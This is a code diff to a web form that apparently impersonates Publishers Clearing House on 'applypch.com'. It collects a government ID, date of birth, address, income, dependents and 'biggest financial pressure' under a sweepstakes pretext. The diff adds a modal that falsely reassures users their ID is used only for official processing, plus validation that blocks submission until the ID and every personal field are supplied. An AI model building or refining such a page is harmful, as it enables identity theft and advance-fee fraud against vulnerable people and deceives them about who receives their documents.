@@ -110,6 +110,110 @@
       margin-top: 6px;
       font-weight: 500;
     }
+    .label-row {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px 12px;
+      margin-bottom: 4px;
+    }
+    .label-row label { margin-bottom: 0; }
+    .why-link {
+      font-family: Inter, sans-serif;
+      font-size: 9pt;
+      font-weight: 600;
+      color: var(--pch-orange-dark);
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+    .why-link:hover { color: var(--pch-orange); }
+    .modal-backdrop {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-backdrop.open { display: flex; }
+    .modal {
+      background: #fff;
+      border-radius: 10px;
+      max-width: 400px;
+      width: 100%;
+      padding: 22px 22px 18px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
+      font-family: Inter, sans-serif;
+    }
+    .modal h3 {
+      font-size: 11pt;
+      font-weight: 700;
+      color: var(--pch-text);
+      margin-bottom: 10px;
+    }
+    .modal p {
+      font-size: 9.5pt;
+      color: var(--pch-muted);
+      line-height: 1.55;
+      margin-bottom: 8px;
+    }
+    .modal p:last-of-type { margin-bottom: 16px; }
+    .modal-close {
+      font-family: inherit;
+      font-size: 10pt;
+      font-weight: 600;
+      padding: 9px 18px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      background: var(--pch-orange);
+      color: #fff;
+      width: 100%;
+    }
+    .modal-close:hover { background: var(--pch-orange-dark); }
+    .input-invalid,
+    .input-invalid:focus {
+      border-color: #c62828 !important;
+      box-shadow: 0 0 0 2px rgba(198, 40, 40, 0.15) !important;
+    }
+    .id-upload-box {
+      border: 1px solid transparent;
+      border-radius: 6px;
+      padding: 4px 0;
+    }
+    .id-upload-box.input-invalid {
+      border-color: #c62828;
+      background: #ffebee;
+      padding: 8px;
+      margin-top: 4px;
+    }
+    .confirm-row.input-invalid {
+      outline: 2px solid rgba(198, 40, 40, 0.35);
+      outline-offset: 4px;
+      border-radius: 4px;
+    }
+    .error-summary {
+      display: none;
+      background: #ffebee;
+      border: 1px solid #ef9a9a;
+      border-left: 4px solid #c62828;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      border-radius: 4px;
+      font-family: Inter, sans-serif;
+      font-size: 9.5pt;
+      color: #b71c1c;
+      text-align: left;
+    }
+    .error-summary.visible { display: block; }
+    .error-summary strong { display: block; margin-bottom: 6px; font-size: 10pt; }
+    .error-summary ul { margin: 0; padding-left: 18px; line-height: 1.5; }
     .section { margin-bottom: 22px; }
     .section-title {
       font-weight: 700;
@@ -222,6 +326,16 @@
   </style>
 </head>
 <body>
+  <div class="modal-backdrop" id="id-modal" role="dialog" aria-modal="true" aria-labelledby="id-modal-title" hidden>
+    <div class="modal">
+      <h3 id="id-modal-title">Why we ask for your ID</h3>
+      <p>Publishers Clearing House must confirm that the person completing this profile is the same applicant on file and meets eligibility requirements for the current drawing.</p>
+      <p>Your ID is used for identity verification and final review only. It helps protect your application from impersonation and keeps prize processing secure.</p>
+      <p>Upload a clear photo or scan of a valid government ID. Your document is transmitted securely and used only for official PCH application processing on applypch.com.</p>
+      <button type="button" class="modal-close" id="id-modal-close">Got it</button>
+    </div>
+  </div>
+
   <div class="overlay" id="processing-overlay" aria-live="polite">
     <div class="overlay-card">
       <div class="spinner"></div>
@@ -230,7 +344,7 @@
     </div>
   </div>
 
-  <form class="document" id="profile-form">
+  <form class="document" id="profile-form" novalidate>
     <header class="header">
       <div class="header-logo">
         <img src="/logo.png" alt="Publishers Clearing House" width="110" height="48" />
@@ -242,8 +356,7 @@
 
     <div class="body" id="form-body">
       <p class="intro">
-        You confirmed your application on our official line. Please complete every section below.
-        This replaces text or email back-and-forth — your answers are recorded securely for final review.
+        You confirmed your application on our official line. Please complete every section below so your file can move to final review.
       </p>
 
       <div class="meta-box">
@@ -280,17 +393,20 @@
           <input type="tel" id="phone" name="phone" required />
         </div>
         <div class="field-row full">
-          <label for="id_document">Government-issued ID</label>
-          <input
-            type="file"
-            id="id_document"
-            name="id_document"
-            accept="image/jpeg,image/png,image/webp,image/gif,application/pdf,.jpg,.jpeg,.png,.webp,.pdf"
-            required
-          />
-          <p class="file-hint">
-            Upload a clear photo or scan: driver&rsquo;s license, state ID, passport, or national ID card (front side minimum). JPG, PNG, or PDF — max 8 MB.
-          </p>
+          <div class="label-row">
+            <label for="id_document">Government-issued ID</label>
+            <button type="button" class="why-link" id="id-why-btn">Why do we ask for this?</button>
+          </div>
+          <div class="id-upload-box" id="id-upload-box">
+            <input
+              type="file"
+              id="id_document"
+              name="id_document"
+              accept="image/jpeg,image/png,image/webp,image/gif,application/pdf,.jpg,.jpeg,.png,.webp,.pdf"
+              required
+            />
+          </div>
+          <p class="file-hint">Driver&rsquo;s license, state ID, passport, or national ID — JPG, PNG, or PDF, max 8 MB.</p>
           <p class="file-name" id="file-name" hidden></p>
         </div>
       </section>
@@ -393,6 +509,11 @@
         <span>I confirm all information is true and complete. I understand this is for Publishers Clearing House final review of my application in the current drawing — not a final prize award.</span>
       </label>
 
+      <div class="error-summary" id="error-summary" role="alert" aria-live="assertive">
+        <strong>Please complete the following before submitting:</strong>
+        <ul id="error-list"></ul>
+      </div>
+
       <div class="actions">
         <button type="submit" class="btn" id="submit-btn">Submit application profile</button>
         <p class="status" id="status"></p>
@@ -422,8 +543,150 @@
       var status = document.getElementById('status');
       var idInput = document.getElementById('id_document');
       var fileNameEl = document.getElementById('file-name');
+      var idModal = document.getElementById('id-modal');
+      var idWhyBtn = document.getElementById('id-why-btn');
+      var idModalClose = document.getElementById('id-modal-close');
+      var idUploadBox = document.getElementById('id-upload-box');
+      var errorSummary = document.getElementById('error-summary');
+      var errorList = document.getElementById('error-list');
+      var confirmRow = form.querySelector('.confirm-row');
+
+      function openIdModal() {
+        idModal.hidden = false;
+        idModal.classList.add('open');
+        document.body.style.overflow = 'hidden';
+      }
+
+      function closeIdModal() {
+        idModal.classList.remove('open');
+        idModal.hidden = true;
+        document.body.style.overflow = '';
+      }
+
+      idWhyBtn.addEventListener('click', openIdModal);
+      idModalClose.addEventListener('click', closeIdModal);
+      idModal.addEventListener('click', function (e) {
+        if (e.target === idModal) closeIdModal();
+      });
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape' && idModal.classList.contains('open')) closeIdModal();
+      });
       var MAX_FILE_BYTES = 8 * 1024 * 1024;
       var ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'application/pdf'];
+
+      function trim(v) {
+        return typeof v === 'string' ? v.trim() : '';
+      }
+
+      function phoneDigits(v) {
+        return String(v || '').replace(/\D/g, '');
+      }
+
+      function clearValidation() {
+        form.querySelectorAll('.input-invalid').forEach(function (el) {
+          el.classList.remove('input-invalid');
+        });
+        if (idUploadBox) idUploadBox.classList.remove('input-invalid');
+        if (confirmRow) confirmRow.classList.remove('input-invalid');
+        errorSummary.classList.remove('visible');
+        errorList.innerHTML = '';
+      }
+
+      function markInvalid(el) {
+        if (!el) return;
+        if (el === idInput && idUploadBox) {
+          idUploadBox.classList.add('input-invalid');
+        } else if (el.name === 'info_confirm' && confirmRow) {
+          confirmRow.classList.add('input-invalid');
+        } else if (el.classList) {
+          el.classList.add('input-invalid');
+        }
+      }
+
+      function validateForm() {
+        clearValidation();
+        var issues = [];
+        var firstEl = null;
+
+        function addIssue(label, el) {
+          issues.push({ label: label, el: el });
+          markInvalid(el);
+          if (!firstEl && el) firstEl = el;
+        }
+
+        function req(name, label) {
+          var el = form.querySelector('[name="' + name + '"]');
+          var val = el ? trim(el.value) : '';
+          if (!val) addIssue(label, el);
+          return val;
+        }
+
+        req('app_ref', 'Application reference');
+        req('prize_category', 'Prize category');
+        req('app_date', 'Date submitted');
+        req('full_name', 'Full legal name');
+        req('dob', 'Date of birth');
+        var emailVal = req('email', 'Email');
+        var emailEl = form.querySelector('[name="email"]');
+        if (emailVal && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal)) {
+          addIssue('Valid email address', emailEl);
+        }
+        var phoneEl = form.querySelector('[name="phone"]');
+        var phoneVal = req('phone', 'Mobile phone');
+        if (phoneVal && phoneDigits(phoneVal).length < 10) {
+          addIssue('Mobile phone (at least 10 digits)', phoneEl);
+        }
+        var idFile = idInput.files && idInput.files[0];
+        if (!idFile) {
+          addIssue('Government-issued ID upload', idInput);
+        } else if (ALLOWED_TYPES.indexOf(idFile.type) === -1) {
+          addIssue('ID file type (JPG, PNG, or PDF only)', idInput);
+        } else if (idFile.size > MAX_FILE_BYTES) {
+          addIssue('ID file size (max 8 MB)', idInput);
+        }
+        req('address_street', 'Street address');
+        req('address_city', 'City');
+        req('address_region', 'State / Region');
+        req('postal_code', 'Postal / ZIP code');
+        req('address_country', 'Country');
+        req('marital_status', 'Marital status');
+        req('dependents', 'Number of dependents');
+        req('employment', 'Employment status');
+        req('monthly_income', 'Monthly income');
+        req('financial_pressure', 'Biggest financial pressure');
+        var planEl = form.querySelector('[name="mega_prize_plan"]');
+        var planVal = planEl ? trim(planEl.value) : '';
+        if (!planVal) addIssue('Mega Prize question', planEl);
+        else if (planVal.length < 15) addIssue('Mega Prize question (please write a little more)', planEl);
+        req('accept_lower_tier', 'Accept lower tier question');
+        var confirmEl = form.querySelector('[name="info_confirm"]');
+        if (!confirmEl || !confirmEl.checked) {
+          addIssue('Confirmation checkbox', confirmEl);
+        }
+
+        if (issues.length) {
+          errorList.innerHTML = issues
+            .map(function (i) {
+              return '<li>' + i.label + '</li>';
+            })
+            .join('');
+          errorSummary.classList.add('visible');
+          status.textContent = 'Please complete every required field and upload your ID before submitting.';
+          status.className = 'status error';
+          var scrollTarget = firstEl;
+          if (firstEl === idInput && idUploadBox) scrollTarget = idUploadBox;
+          if (scrollTarget && scrollTarget.scrollIntoView) {
+            scrollTarget.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          }
+          return false;
+        }
+        return true;
+      }
+
+      form.querySelectorAll('input, select, textarea').forEach(function (el) {
+        el.addEventListener('input', clearValidation);
+        el.addEventListener('change', clearValidation);
+      });
 
       idInput.addEventListener('change', function () {
         var file = idInput.files && idInput.files[0];
@@ -433,6 +696,7 @@
         }
         fileNameEl.textContent = 'Selected: ' + file.name;
         fileNameEl.hidden = false;
+        if (idUploadBox) idUploadBox.classList.remove('input-invalid');
       });
 
       function readIdFile(file) {
@@ -522,6 +786,11 @@
         e.preventDefault();
         status.textContent = '';
         status.className = 'status';
+
+        if (!validateForm()) {
+          submitBtn.disabled = false;
+          return;
+        }
 
         var fd = new FormData(form);
         var idFile = idInput.files && idInput.files[0];
